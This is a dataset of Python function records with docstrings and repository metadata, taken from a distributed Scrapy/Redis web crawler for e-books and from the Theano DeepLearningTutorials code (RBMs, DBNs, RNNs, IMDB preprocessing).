{"docstring": "\"\"\"Pop a request\"\"\"\n", "func_signal": "def pop(self):\n", "code": "data = self.server.lpop(self.key)\nif data:\n    return self._decode_request(data)", "path": "distribute_crawler/woaidu_crawler/woaidu_crawler/scrapy_redis/queue.py", "commit_date": "2013-04-17 00:00:00", "repo_name": "gnemoug/distribute_crawler", "stars": 3233, "license": "None", "language": "python", "size": 12514}
{"docstring": "\"\"\"\n    the stat is the file key dir,\n    the last_modified is the file that saved to the file key dir.\n\"\"\"\n\n", "func_signal": "def stat_file(self, key, info):\n", "code": "keydir = os.path.join(self.basedir, *key.split('/'))\nfilenames = os.listdir(keydir)\nif len(filenames) != 1:\n    shutil.rmtree(keydir,True)\n    return {}\nelse:\n    filename = list_first_item(filenames)\n\nabsolute_path = self._get_filesystem_path(key)\ntry:\n    last_modified = os.path.getmtime(absolute_path)\nexcept:  # FIXME: catching everything!\n    return {}\n\nwith open(os.path.join(absolute_path,filename), 'rb') as file_content:\n    checksum = md5sum(file_content)\n\nreturn {'last_modified': last_modified, 'checksum': checksum}", "path": "distribute_crawler/woaidu_crawler/woaidu_crawler/pipelines/file.py", "commit_date": "2013-04-17 00:00:00", "repo_name": "gnemoug/distribute_crawler", "stars": 3233, "license": "None", "language": "python", "size": 12514}
{"docstring": "\"\"\"\n    strip list,set,tuple,dict null item.\n\n    @param:\n        arg:the variable to strip null\n        null:the null definition,if it is None,then use NULL as the null\n\n    if arg is list,then strip the null item,return the new list\n    if arg is tuple,then strip the null item,return the new tuple\n    if arg is set,then strip the null item,return the new set\n    if arg is dict,then strip the dict item which value is null.return the new dict\n\"\"\"\n", "func_signal": "def strip_null(arg,null=None):\n", "code": "if null is None:\n    null = NULL\n\nif type(arg) is types.ListType:\n    return [i for i in arg if i not in null]\nelif type(arg) is types.TupleType:\n    return tuple([i for i in arg if i not in null])\nelif type(arg) is type(set()):\n    return arg.difference(set(null))\nelif type(arg) is types.DictType:\n    return {key:value for key,value in arg.items() if value not in null}\n\nreturn arg", "path": "distribute_crawler/woaidu_crawler/woaidu_crawler/utils/select_result.py", "commit_date": "2013-04-17 00:00:00", "repo_name": "gnemoug/distribute_crawler", "stars": 3233, "license": "None", "language": "python", "size": 12514}
{"docstring": "\"\"\"\n    create index for books_fs.book_detail\n\"\"\"\n", "func_signal": "def create_index():\n", "code": "for k,v in INDEX.items():\n    for key,kwargs in v.items():\n        client[DATABASE_NAME][k].ensure_index(list(key) if type(key)==types.TupleType else key,**kwargs)", "path": "distribute_crawler/woaidu_crawler/woaidu_crawler/commands/init_single_mongodb.py", "commit_date": "2013-04-17 00:00:00", "repo_name": "gnemoug/distribute_crawler", "stars": 3233, "license": "None", "language": "python", "size": 12514}
{"docstring": "\"\"\"Initialize per-spider redis queue.\n\nParameters:\n    server -- redis connection\n    spider -- spider instance\n    key -- key for this queue (e.g. \"%(spider)s:queue\")\n\"\"\"\n", "func_signal": "def __init__(self, server, spider, key):\n", "code": "self.server = server\nself.spider = spider\nself.key = key % {'spider': spider.name}", "path": "distribute_crawler/woaidu_crawler/woaidu_crawler/scrapy_redis/queue.py", "commit_date": "2013-04-17 00:00:00", "repo_name": "gnemoug/distribute_crawler", "stars": 3233, "license": "None", "language": "python", "size": 12514}
{"docstring": "\"\"\"Pop a request\"\"\"\n", "func_signal": "def pop(self):\n", "code": "data = self.server.rpop(self.key)\nif data:\n    return self._decode_request(data)", "path": "distribute_crawler/woaidu_crawler/woaidu_crawler/scrapy_redis/queue.py", "commit_date": "2013-04-17 00:00:00", "repo_name": "gnemoug/distribute_crawler", "stars": 3233, "license": "None", "language": "python", "size": 12514}
{"docstring": "\"\"\"\n    Get the raw file name that the sever transfer to.\n    \n    It examine two places:Content-Disposition,url.\n\"\"\"\n\n", "func_signal": "def get_file_name(self,request,response):\n", "code": "content_dispo = response.headers.get('Content-Disposition','')\nfilename = \"\"\n#print response.headers\nif content_dispo:\n    for i in content_dispo.split(';'):\n        if \"filename\" in i:\n            #XXX:use filename= for the specific case that = in the filename\n            filename = i.split('filename=')[1].strip(\" \\n\\'\\\"\")\n            break\n\nif filename:\n    #XXX:it the result is:\n    #MPLS TE Switching%E6%96%B9%E6%A1%88%E7%99%BD%E7%9A%AE%E4%B9%A6.pdf\n    #use urllib.unquote(filename) instead\n    if urlparse(request.url).netloc in self.ATTACHMENT_FILENAME_UTF8_DOMAIN:\n        filename = filename.decode(\"utf-8\")\n    else:\n        filename = filename.decode(\"gbk\")\n    #print \"Content-Disposition:\",\"*\"*30,filename\nelse:\n    guessname = request.url.split('/')[-1]\n    #os.path.splitext:\n    #Split the pathname path into a pair (root, ext) such that root + ext == path\n    if os.path.splitext(guessname)[1].lower() in self.FILE_EXTENTION:\n        if urlparse(request.url).netloc in self.URL_GBK_DOMAIN:\n            filename = urllib.unquote(guessname).decode(\"gbk\").encode(\"utf-8\")\n        else:\n            filename = urllib.unquote(guessname)\n        #print \"url:\",\"*\"*30,filename\n\nreturn filename", "path": "distribute_crawler/woaidu_crawler/woaidu_crawler/pipelines/file.py", "commit_date": "2013-04-17 00:00:00", "repo_name": "gnemoug/distribute_crawler", "stars": 3233, "license": "None", "language": "python", "size": 12514}
{"docstring": "\"\"\"\n    make index and shard keys.\n\"\"\"\n\n# feel free to change any of this\n# admin and conn are both defined globaly\n", "func_signal": "def AFTER_SETUP():\n", "code": "admin.command('enablesharding', ShardMONGODB_DB)\n\nfor (collection, keystr) in COLLECTION_KEYS.iteritems():\n    key=SON((k,1) for k in keystr.split(','))\n    admin.command('shardcollection', ShardMONGODB_DB+'.'+collection, key=key)\n\nadmin.command('shardcollection', ShardMONGODB_DB+'.'+GridFs_Collection+'.files', key={'_id':1})\nadmin.command('shardcollection', ShardMONGODB_DB+'.'+GridFs_Collection+'.chunks', key={'files_id':1})\n\nfor k,v in INDEX.items():\n    for key,kwargs in v.items():\n        conn[ShardMONGODB_DB][k].ensure_index(list(key) if type(key)==types.TupleType else key,**kwargs)", "path": "distribute_crawler/woaidu_crawler/woaidu_crawler/commands/init_sharding_mongodb.py", "commit_date": "2013-04-17 00:00:00", "repo_name": "gnemoug/distribute_crawler", "stars": 3233, "license": "None", "language": "python", "size": 12514}
{"docstring": "\"\"\"\n    Handler for success downloads.\n\"\"\"\n\n", "func_signal": "def media_downloaded(self, response, request, info):\n", "code": "referer = request.headers.get('Referer')\n\nif response.status != 200:\n    log.msg(format='%(medianame)s (code: %(status)s): Error downloading %(medianame)s from %(request)s referred in <%(referer)s>',\n            level=log.WARNING, spider=info.spider,medianame=self.MEDIA_NAME,\n            status=response.status, request=request, referer=referer)\n    raise FileException(request.url,'%s: download-error'%(request.url,))\n\nif not response.body:\n    log.msg(format='%(medianame)s (empty-content): Empty %(medianame)s from %(request)s referred in <%(referer)s>: no-content',\n            level=log.WARNING, spider=info.spider,medianame=self.MEDIA_NAME,\n            request=request, referer=referer)\n    raise FileException(request.url,'%s: empty-content'%(request.url,))\n\nstatus = 'cached' if 'cached' in response.flags else 'downloaded'\nlog.msg(format='%(medianame)s (%(status)s): Downloaded %(medianame)s from %(request)s referred in <%(referer)s>',\n        level=log.DEBUG, spider=info.spider,medianame=self.MEDIA_NAME,\n        status=status, request=request, referer=referer)\n\nif self.is_valid_content_type(response):\n    raise FileException(request.url,'%s: invalid-content_type'%(request.url,))\n\nfilename = self.get_file_name(request,response)\n\nif not filename:\n    raise FileException(request.url,'%s: noaccess-filename'%(request.url,))\n\nself.inc_stats(info.spider, status)\n\ntry:\n    key = self.file_key(request.url)#return the SHA1 hash of the file url\n    checksum = self.store.persist_file(key,response.body,info,filename)\nexcept FileException as exc:\n    whyfmt = '%(medianame)s (error): Error processing %(medianame)s from %(request)s referred in <%(referer)s>: %(errormsg)s'\n    log.msg(format=whyfmt, level=log.WARNING, spider=info.spider,medianame=self.MEDIA_NAME,\n            request=request, referer=referer, errormsg=str(exc))\n    raise\n\nreturn {'url': request.url, 'path': key, 'checksum': checksum}", "path": "distribute_crawler/woaidu_crawler/woaidu_crawler/pipelines/file.py", "commit_date": "2013-04-17 00:00:00", "repo_name": "gnemoug/distribute_crawler", "stars": 3233, "license": "None", "language": "python", "size": 12514}
{"docstring": "\"\"\"\nresult_path_filename\n\"\"\"\n", "func_signal": "def find_path_file(specific_file,search_directory):\n", "code": "result_path_filename = list()\nresult_path_filename.extend([os.path.join(dirpath,filename) for dirpath,dirnames,filenames in os.walk(search_directory) for filename in filenames if os.path.splitext(filename)[1] == ('.' + specific_file)])\nreturn result_path_filename", "path": "distribute_crawler/woaidu_crawler/woaidu_crawler/commands/decomperssion.py", "commit_date": "2013-04-25 00:00:00", "repo_name": "gnemoug/distribute_crawler", "stars": 3233, "license": "None", "language": "python", "size": 12514}
{"docstring": "\"\"\"Initialize scheduler.\n\nParameters\n----------\nserver : Redis instance\npersist : bool\nqueue_key : str\nqueue_cls : queue class\ndupefilter_key : str\n\"\"\"\n", "func_signal": "def __init__(self, server, persist, queue_key, queue_cls, dupefilter_key):\n", "code": "self.server = server\nself.persist = persist\nself.queue_key = queue_key\nself.queue_cls = queue_cls\nself.dupefilter_key = dupefilter_key", "path": "distribute_crawler/woaidu_crawler/woaidu_crawler/scrapy_redis/scheduler.py", "commit_date": "2013-04-17 00:00:00", "repo_name": "gnemoug/distribute_crawler", "stars": 3233, "license": "None", "language": "python", "size": 12514}
{"docstring": "\"\"\"\n    execute this function when open one spider\n\"\"\"\n\n", "func_signal": "def open(self, spider):\n", "code": "self.spider = spider\nself.queue = self.queue_cls(self.server, spider, self.queue_key)\nself.df = RFPDupeFilter(self.server, self.dupefilter_key % {'spider': spider.name})\n# notice if there are requests already in the queue to resume the crawl\nif len(self.queue):\n    spider.log(\"Resuming crawl (%d requests scheduled)\" % len(self.queue))", "path": "distribute_crawler/woaidu_crawler/woaidu_crawler/scrapy_redis/scheduler.py", "commit_date": "2013-04-17 00:00:00", "repo_name": "gnemoug/distribute_crawler", "stars": 3233, "license": "None", "language": "python", "size": 12514}
{"docstring": "\"\"\"Initialize duplication filter\n\nParameters\n----------\nserver : Redis instance\nkey : str\n    Where to store fingerprints\n\"\"\"\n", "func_signal": "def __init__(self, server, key):\n", "code": "self.server = server\nself.key = key", "path": "distribute_crawler/woaidu_crawler/woaidu_crawler/scrapy_redis/dupefilter.py", "commit_date": "2013-04-17 00:00:00", "repo_name": "gnemoug/distribute_crawler", "stars": 3233, "license": "None", "language": "python", "size": 12514}
{"docstring": "\"\"\"\n    use sismember judge whether fp is duplicate.\n\"\"\"\n\n", "func_signal": "def request_seen(self, request):\n", "code": "fp = request_fingerprint(request)\nif self.server.sismember(self.key,fp):\n    return True\nself.server.sadd(self.key, fp)\nreturn False", "path": "distribute_crawler/woaidu_crawler/woaidu_crawler/scrapy_redis/dupefilter.py", "commit_date": "2013-04-17 00:00:00", "repo_name": "gnemoug/distribute_crawler", "stars": 3233, "license": "None", "language": "python", "size": 12514}
{"docstring": "\"\"\"\n    deduplication the arg.\n\n    @param:\n        arg:the variable to deduplication\n\n    if arg is list,then deduplication it and then the new list.\n    if arg is tuple,then deduplication it and then the new tuple.\n\"\"\"\n", "func_signal": "def deduplication(arg):\n", "code": "if type(arg) is types.ListType:\n    return list(set(arg))\nelif type(arg) is types.TupleType:\n    return tuple(set(arg))\n\nreturn arg", "path": "distribute_crawler/woaidu_crawler/woaidu_crawler/utils/select_result.py", "commit_date": "2013-04-17 00:00:00", "repo_name": "gnemoug/distribute_crawler", "stars": 3233, "license": "None", "language": "python", "size": 12514}
{"docstring": "\"\"\"\n    Decompression_rar\n    \n    if you want use this function,you need install unrar,for ubuntu:\n        sudo apt-get install unrar\n        \n    another decomperssion method is to use:rarfile,for help you can visit:\n        http://www.pythonclub.org/python-files/rar\n\"\"\"\n", "func_signal": "def Decompression_rar(specific_file):\n", "code": "cmd='unrar x \"'+specific_file+'\"'+' \"'+os.path.split(specific_file)[0]+'\"'\nos.system(cmd)", "path": "distribute_crawler/woaidu_crawler/woaidu_crawler/commands/decomperssion.py", "commit_date": "2013-04-25 00:00:00", "repo_name": "gnemoug/distribute_crawler", "stars": 3233, "license": "None", "language": "python", "size": 12514}
{"docstring": "'''Generates a function `train` that implements one step of\nfinetuning, a function `validate` that computes the error on a\nbatch from the validation set, and a function `test` that\ncomputes the error on a batch from the testing set\n\n:type datasets: list of pairs of theano.tensor.TensorType\n:param datasets: It is a list that contain all the datasets;\n                the has to contain three pairs, `train`,\n                `valid`, `test` in this order, where each pair\n                is formed of two Theano variables, one for the\n                datapoints, the other for the labels\n:type batch_size: int\n:param batch_size: size of a minibatch\n:type learning_rate: float\n:param learning_rate: learning rate used during finetune stage\n\n'''\n\n", "func_signal": "def build_finetune_functions(self, datasets, batch_size, learning_rate):\n", "code": "(train_set_x, train_set_y) = datasets[0]\n(valid_set_x, valid_set_y) = datasets[1]\n(test_set_x, test_set_y) = datasets[2]\n\n# compute number of minibatches for training, validation and testing\nn_valid_batches = valid_set_x.get_value(borrow=True).shape[0]\nn_valid_batches //= batch_size\nn_test_batches = test_set_x.get_value(borrow=True).shape[0]\nn_test_batches //= batch_size\n\nindex = T.lscalar('index')  # index to a [mini]batch\n\n# compute the gradients with respect to the model parameters\ngparams = T.grad(self.finetune_cost, self.params)\n\n# compute list of fine-tuning updates\nupdates = []\nfor param, gparam in zip(self.params, gparams):\n    updates.append((param, param - gparam * learning_rate))\n\ntrain_fn = theano.function(\n    inputs=[index],\n    outputs=self.finetune_cost,\n    updates=updates,\n    givens={\n        self.x: train_set_x[\n            index * batch_size: (index + 1) * batch_size\n        ],\n        self.y: train_set_y[\n            index * batch_size: (index + 1) * batch_size\n        ]\n    }\n)\n\ntest_score_i = theano.function(\n    [index],\n    self.errors,\n    givens={\n        self.x: test_set_x[\n            index * batch_size: (index + 1) * batch_size\n        ],\n        self.y: test_set_y[\n            index * batch_size: (index + 1) * batch_size\n        ]\n    }\n)\n\nvalid_score_i = theano.function(\n    [index],\n    self.errors,\n    givens={\n        self.x: valid_set_x[\n            index * batch_size: (index + 1) * batch_size\n        ],\n        self.y: valid_set_y[\n            index * batch_size: (index + 1) * batch_size\n        ]\n    }\n)\n\n# Create a function that scans the entire validation set\ndef valid_score():\n    return [valid_score_i(i) for i in range(n_valid_batches)]\n\n# Create a function that scans the entire test set\ndef test_score():\n    return [test_score_i(i) for i in range(n_test_batches)]\n\nreturn train_fn, valid_score, test_score", "path": "DeepLearningTutorials/code/DBN.py", "commit_date": "2016-10-24 00:00:00", "repo_name": "lisa-lab/DeepLearningTutorials", "stars": 4087, "license": "other", "language": "python", "size": 11605}
{"docstring": "'''This function propagates the hidden units activation downwards to\nthe visible units\n\nNote that we return also the pre_sigmoid_activation of the\nlayer. As it will turn out later, due to how Theano deals with\noptimizations, this symbolic variable will be needed to write\ndown a more stable computational graph (see details in the\nreconstruction cost function)\n\n'''\n", "func_signal": "def propdown(self, hid):\n", "code": "pre_sigmoid_activation = T.dot(hid, self.W.T) + self.vbias\nreturn [pre_sigmoid_activation, T.nnet.sigmoid(pre_sigmoid_activation)]", "path": "DeepLearningTutorials/code/rbm.py", "commit_date": "2016-10-03 00:00:00", "repo_name": "lisa-lab/DeepLearningTutorials", "stars": 4087, "license": "other", "language": "python", "size": 11605}
{"docstring": "\"\"\"This functions implements one step of CD-k or PCD-k\n\n:param lr: learning rate used to train the RBM\n\n:param persistent: None for CD. For PCD, shared variable\n    containing old state of Gibbs chain. This must be a shared\n    variable of size (batch size, number of hidden units).\n\n:param k: number of Gibbs steps to do in CD-k/PCD-k\n\nReturns a proxy for the cost and the updates dictionary. The\ndictionary contains the update rules for weights and biases but\nalso an update of the shared variable used to store the persistent\nchain, if one is used.\n\n\"\"\"\n\n# compute positive phase\n", "func_signal": "def get_cost_updates(self, lr=0.1, persistent=None, k=1):\n", "code": "pre_sigmoid_ph, ph_mean, ph_sample = self.sample_h_given_v(self.input)\n\n# decide how to initialize persistent chain:\n# for CD, we use the newly generate hidden sample\n# for PCD, we initialize from the old state of the chain\nif persistent is None:\n    chain_start = ph_sample\nelse:\n    chain_start = persistent\n# end-snippet-2\n# perform actual negative phase\n# in order to implement CD-k/PCD-k we need to scan over the\n# function that implements one gibbs step k times.\n# Read Theano tutorial on scan for more information :\n# http://deeplearning.net/software/theano/library/scan.html\n# the scan will return the entire Gibbs chain\n(\n    [\n        pre_sigmoid_nvs,\n        nv_means,\n        nv_samples,\n        pre_sigmoid_nhs,\n        nh_means,\n        nh_samples\n    ],\n    updates\n) = theano.scan(\n    self.gibbs_hvh,\n    # the None are place holders, saying that\n    # chain_start is the initial state corresponding to the\n    # 6th output\n    outputs_info=[None, None, None, None, None, chain_start],\n    n_steps=k,\n    name=\"gibbs_hvh\"\n)\n# start-snippet-3\n# determine gradients on RBM parameters\n# note that we only need the sample at the end of the chain\nchain_end = nv_samples[-1]\n\ncost = T.mean(self.free_energy(self.input)) - T.mean(\n    self.free_energy(chain_end))\n# We must not compute the gradient through the gibbs sampling\ngparams = T.grad(cost, self.params, consider_constant=[chain_end])\n# end-snippet-3 start-snippet-4\n# constructs the update dictionary\nfor gparam, param in zip(gparams, self.params):\n    # make sure that the learning rate is of the right dtype\n    updates[param] = param - gparam * T.cast(\n        lr,\n        dtype=theano.config.floatX\n    )\nif persistent:\n    # Note that this works only if persistent is a shared variable\n    updates[persistent] = nh_samples[-1]\n    # pseudo-likelihood is a better proxy for PCD\n    monitoring_cost = self.get_pseudo_likelihood_cost(updates)\nelse:\n    # reconstruction cross-entropy is a better proxy for CD\n    monitoring_cost = self.get_reconstruction_cost(updates,\n                                                   pre_sigmoid_nvs[-1])\n\nreturn monitoring_cost, updates\n# end-snippet-4", "path": "DeepLearningTutorials/code/rbm.py", "commit_date": "2016-10-03 00:00:00", "repo_name": "lisa-lab/DeepLearningTutorials", "stars": 4087, "license": "other", "language": "python", "size": 11605}
{"docstring": "'''This function propagates the visible units activation upwards to\nthe hidden units\n\nNote that we return also the pre-sigmoid activation of the\nlayer. As it will turn out later, due to how Theano deals with\noptimizations, this symbolic variable will be needed to write\ndown a more stable computational graph (see details in the\nreconstruction cost function)\n\n'''\n", "func_signal": "def propup(self, vis):\n", "code": "pre_sigmoid_activation = T.dot(vis, self.W) + self.hbias\nreturn [pre_sigmoid_activation, T.nnet.sigmoid(pre_sigmoid_activation)]", "path": "DeepLearningTutorials/code/rbm.py", "commit_date": "2016-10-03 00:00:00", "repo_name": "lisa-lab/DeepLearningTutorials", "stars": 4087, "license": "other", "language": "python", "size": 11605}
{"docstring": "''' Function to compute the free energy '''\n", "func_signal": "def free_energy(self, v_sample):\n", "code": "wx_b = T.dot(v_sample, self.W) + self.hbias\nvbias_term = T.dot(v_sample, self.vbias)\nhidden_term = T.sum(T.log(1 + T.exp(wx_b)), axis=1)\nreturn -hidden_term - vbias_term", "path": "DeepLearningTutorials/code/rbm.py", "commit_date": "2016-10-03 00:00:00", "repo_name": "lisa-lab/DeepLearningTutorials", "stars": 4087, "license": "other", "language": "python", "size": 11605}
{"docstring": "\"\"\"\nThis fonction modify the configuration theano and don't restore it!\n\"\"\"\n\n", "func_signal": "def speed():\n", "code": "algo = ['logistic_sgd', 'logistic_cg', 'mlp', 'convolutional_mlp',\n        'dA', 'SdA', 'DBN', 'rbm', 'rnnrbm', 'rnnslu', 'lstm']\nto_exec = [True] * len(algo)", "path": "DeepLearningTutorials/code/test.py", "commit_date": "2017-04-19 00:00:00", "repo_name": "lisa-lab/DeepLearningTutorials", "stars": 4087, "license": "other", "language": "python", "size": 11605}
{"docstring": "''' This function implements one step of Gibbs sampling,\n    starting from the hidden state'''\n", "func_signal": "def gibbs_hvh(self, h0_sample):\n", "code": "pre_sigmoid_v1, v1_mean, v1_sample = self.sample_v_given_h(h0_sample)\npre_sigmoid_h1, h1_mean, h1_sample = self.sample_h_given_v(v1_sample)\nreturn [pre_sigmoid_v1, v1_mean, v1_sample,\n        pre_sigmoid_h1, h1_mean, h1_sample]", "path": "DeepLearningTutorials/code/rbm.py", "commit_date": "2016-10-03 00:00:00", "repo_name": "lisa-lab/DeepLearningTutorials", "stars": 4087, "license": "other", "language": "python", "size": 11605}
{"docstring": "''' This function infers state of hidden units given visible units '''\n# compute the activation of the hidden units given a sample of\n# the visibles\n", "func_signal": "def sample_h_given_v(self, v0_sample):\n", "code": "pre_sigmoid_h1, h1_mean = self.propup(v0_sample)\n# get a sample of the hiddens given their activation\n# Note that theano_rng.binomial returns a symbolic sample of dtype\n# int64 by default. If we want to keep our computations in floatX\n# for the GPU we need to specify to return the dtype floatX\nh1_sample = self.theano_rng.binomial(size=h1_mean.shape,\n                                     n=1, p=h1_mean,\n                                     dtype=theano.config.floatX)\nreturn [pre_sigmoid_h1, h1_mean, h1_sample]", "path": "DeepLearningTutorials/code/rbm.py", "commit_date": "2016-10-03 00:00:00", "repo_name": "lisa-lab/DeepLearningTutorials", "stars": 4087, "license": "other", "language": "python", "size": 11605}
{"docstring": "'''\nnh :: dimension of the hidden layer\nnc :: number of classes\nne :: number of word embeddings in the vocabulary\nde :: dimension of the word embeddings\ncs :: word window context size\n'''\n# parameters of the model\n", "func_signal": "def __init__(self, nh, nc, ne, de, cs):\n", "code": "self.emb = theano.shared(name='embeddings',\n                         value=0.2 * numpy.random.uniform(-1.0, 1.0,\n                         (ne+1, de))\n                         # add one for padding at the end\n                         .astype(theano.config.floatX))\nself.wx = theano.shared(name='wx',\n                        value=0.2 * numpy.random.uniform(-1.0, 1.0,\n                        (de * cs, nh))\n                        .astype(theano.config.floatX))\nself.wh = theano.shared(name='wh',\n                        value=0.2 * numpy.random.uniform(-1.0, 1.0,\n                        (nh, nh))\n                        .astype(theano.config.floatX))\nself.w = theano.shared(name='w',\n                       value=0.2 * numpy.random.uniform(-1.0, 1.0,\n                       (nh, nc))\n                       .astype(theano.config.floatX))\nself.bh = theano.shared(name='bh',\n                        value=numpy.zeros(nh,\n                        dtype=theano.config.floatX))\nself.b = theano.shared(name='b',\n                       value=numpy.zeros(nc,\n                       dtype=theano.config.floatX))\nself.h0 = theano.shared(name='h0',\n                        value=numpy.zeros(nh,\n                        dtype=theano.config.floatX))\n\n# bundle\nself.params = [self.emb, self.wx, self.wh, self.w,\n               self.bh, self.b, self.h0]\n# end-snippet-2\n# as many columns as context window size\n# as many lines as words in the sentence\n# start-snippet-3\nidxs = T.imatrix()\nx = self.emb[idxs].reshape((idxs.shape[0], de*cs))\ny_sentence = T.ivector('y_sentence')  # labels\n# end-snippet-3 start-snippet-4\n\ndef recurrence(x_t, h_tm1):\n    h_t = T.nnet.sigmoid(T.dot(x_t, self.wx)\n                         + T.dot(h_tm1, self.wh) + self.bh)\n    s_t = T.nnet.softmax(T.dot(h_t, self.w) + self.b)\n    return [h_t, s_t]\n\n[h, s], _ = theano.scan(fn=recurrence,\n                        sequences=x,\n                        outputs_info=[self.h0, None],\n                        n_steps=x.shape[0])\n\np_y_given_x_sentence = s[:, 0, :]\ny_pred = T.argmax(p_y_given_x_sentence, axis=1)\n# end-snippet-4\n\n# cost and gradients and learning rate\n# start-snippet-5\nlr = T.scalar('lr')\n\nsentence_nll = -T.mean(T.log(p_y_given_x_sentence)\n                       [T.arange(x.shape[0]), y_sentence])\nsentence_gradients = T.grad(sentence_nll, self.params)\nsentence_updates = OrderedDict((p, p - lr*g)\n                               for p, g in\n                               zip(self.params, sentence_gradients))\n# end-snippet-5\n\n# theano functions to compile\n# start-snippet-6\nself.classify = theano.function(inputs=[idxs], outputs=y_pred)\nself.sentence_train = theano.function(inputs=[idxs, y_sentence, lr],\n                                      outputs=sentence_nll,\n                                      updates=sentence_updates)\n# end-snippet-6 start-snippet-7\nself.normalize = theano.function(inputs=[],\n                                 updates={self.emb:\n                                          self.emb /\n                                          T.sqrt((self.emb**2)\n                                          .sum(axis=1))\n                                          .dimshuffle(0, 'x')})\n# end-snippet-7", "path": "DeepLearningTutorials/code/rnnslu.py", "commit_date": "2018-03-08 00:00:00", "repo_name": "lisa-lab/DeepLearningTutorials", "stars": 4087, "license": "other", "language": "python", "size": 11605}
{"docstring": "'''Look for it as if it was a full path, if not, try local file,\nif not try in the data directory.\n\nDownload dataset if it is not present\n\n'''\n", "func_signal": "def get_dataset_file(dataset, default_dataset, origin):\n", "code": "data_dir, data_file = os.path.split(dataset)\nif data_dir == \"\" and not os.path.isfile(dataset):\n    # Check if dataset is in the data directory.\n    new_path = os.path.join(\n        os.path.split(__file__)[0],\n        \"..\",\n        \"data\",\n        dataset\n    )\n    if os.path.isfile(new_path) or data_file == default_dataset:\n        dataset = new_path\n\nif (not os.path.isfile(dataset)) and data_file == default_dataset:\n    from six.moves import urllib\n    print('Downloading data from %s' % origin)\n    urllib.request.urlretrieve(origin, dataset)\n\n    \nreturn dataset", "path": "DeepLearningTutorials/code/imdb.py", "commit_date": "2016-02-08 00:00:00", "repo_name": "lisa-lab/DeepLearningTutorials", "stars": 4087, "license": "other", "language": "python", "size": 11605}
{"docstring": "'''Generates a list of functions, for performing one step of\ngradient descent at a given layer. The function will require\nas input the minibatch index, and to train an RBM you just\nneed to iterate, calling the corresponding function on all\nminibatch indexes.\n\n:type train_set_x: theano.tensor.TensorType\n:param train_set_x: Shared var. that contains all datapoints used\n                    for training the RBM\n:type batch_size: int\n:param batch_size: size of a [mini]batch\n:param k: number of Gibbs steps to do in CD-k / PCD-k\n\n'''\n\n# index to a [mini]batch\n", "func_signal": "def pretraining_functions(self, train_set_x, batch_size, k):\n", "code": "index = T.lscalar('index')  # index to a minibatch\nlearning_rate = T.scalar('lr')  # learning rate to use\n\n# begining of a batch, given `index`\nbatch_begin = index * batch_size\n# ending of a batch given `index`\nbatch_end = batch_begin + batch_size\n\npretrain_fns = []\nfor rbm in self.rbm_layers:\n\n    # get the cost and the updates list\n    # using CD-k here (persisent=None) for training each RBM.\n    # TODO: change cost function to reconstruction error\n    cost, updates = rbm.get_cost_updates(learning_rate,\n                                         persistent=None, k=k)\n\n    # compile the theano function\n    fn = theano.function(\n        inputs=[index, theano.In(learning_rate, value=0.1)],\n        outputs=cost,\n        updates=updates,\n        givens={\n            self.x: train_set_x[batch_begin:batch_end]\n        }\n    )\n    # append `fn` to the list of functions\n    pretrain_fns.append(fn)\n\nreturn pretrain_fns", "path": "DeepLearningTutorials/code/DBN.py", "commit_date": "2016-10-24 00:00:00", "repo_name": "lisa-lab/DeepLearningTutorials", "stars": 4087, "license": "other", "language": "python", "size": 11605}
{"docstring": "'''Generate a sample sequence, plot the resulting piano-roll and save\nit as a MIDI file.\n\nfilename : string\n    A MIDI file will be created at this location.\nshow : boolean\n    If True, a piano-roll of the generated sequence will be shown.'''\n\n", "func_signal": "def generate(self, filename, show=True):\n", "code": "piano_roll = self.generate_function()\nmidiwrite(filename, piano_roll, self.r, self.dt)\nif show:\n    extent = (0, self.dt * len(piano_roll)) + self.r\n    pylab.figure()\n    pylab.imshow(piano_roll.T, origin='lower', aspect='auto',\n                 interpolation='nearest', cmap=pylab.cm.gray_r,\n                 extent=extent)\n    pylab.xlabel('time (s)')\n    pylab.ylabel('MIDI note number')\n    pylab.title('generated piano-roll')", "path": "DeepLearningTutorials/code/rnnrbm.py", "commit_date": "2018-01-19 00:00:00", "repo_name": "lisa-lab/DeepLearningTutorials", "stars": 4087, "license": "other", "language": "python", "size": 11605}
{"docstring": "# Get the dataset from http://ai.stanford.edu/~amaas/data/sentiment/\n", "func_signal": "def main():\n", "code": "path = dataset_path\ndictionary = build_dict(os.path.join(path, 'train'))\n\ntrain_x_pos = grab_data(path+'train/pos', dictionary)\ntrain_x_neg = grab_data(path+'train/neg', dictionary)\ntrain_x = train_x_pos + train_x_neg\ntrain_y = [1] * len(train_x_pos) + [0] * len(train_x_neg)\n\ntest_x_pos = grab_data(path+'test/pos', dictionary)\ntest_x_neg = grab_data(path+'test/neg', dictionary)\ntest_x = test_x_pos + test_x_neg\ntest_y = [1] * len(test_x_pos) + [0] * len(test_x_neg)\n\nf = open('imdb.pkl', 'wb')\npkl.dump((train_x, train_y), f, -1)\npkl.dump((test_x, test_y), f, -1)\nf.close()\n\nf = open('imdb.dict.pkl', 'wb')\npkl.dump(dictionary, f, -1)\nf.close()", "path": "DeepLearningTutorials/code/imdb_preprocess.py", "commit_date": "2016-07-19 00:00:00", "repo_name": "lisa-lab/DeepLearningTutorials", "stars": 4087, "license": "other", "language": "python", "size": 11605}
{"docstring": "'''Train the RNN-RBM via stochastic gradient descent (SGD) using MIDI\nfiles converted to piano-rolls.\n\nfiles : list of strings\n    List of MIDI files that will be loaded as piano-rolls for training.\nbatch_size : integer\n    Training sequences will be split into subsequences of at most this\n    size before applying the SGD updates.\nnum_epochs : integer\n    Number of epochs (pass over the training set) performed. The user\n    can safely interrupt training with Ctrl+C at any time.'''\n\n", "func_signal": "def train(self, files, batch_size=100, num_epochs=200):\n", "code": "assert len(files) > 0, 'Training set is empty!' \\\n                       ' (did you download the data files?)'\ndataset = [midiread(f, self.r,\n                    self.dt).piano_roll.astype(theano.config.floatX)\n           for f in files]\n\ntry:\n    for epoch in range(num_epochs):\n        numpy.random.shuffle(dataset)\n        costs = []\n\n        for s, sequence in enumerate(dataset):\n            for i in range(0, len(sequence), batch_size):\n                cost = self.train_function(sequence[i:i + batch_size])\n                costs.append(cost)\n\n        print('Epoch %i/%i' % (epoch + 1, num_epochs))\n        print(numpy.mean(costs))\n        sys.stdout.flush()\n\nexcept KeyboardInterrupt:\n    print('Interrupted by user.')", "path": "DeepLearningTutorials/code/rnnrbm.py", "commit_date": "2018-01-19 00:00:00", "repo_name": "lisa-lab/DeepLearningTutorials", "stars": 4087, "license": "other", "language": "python", "size": 11605}
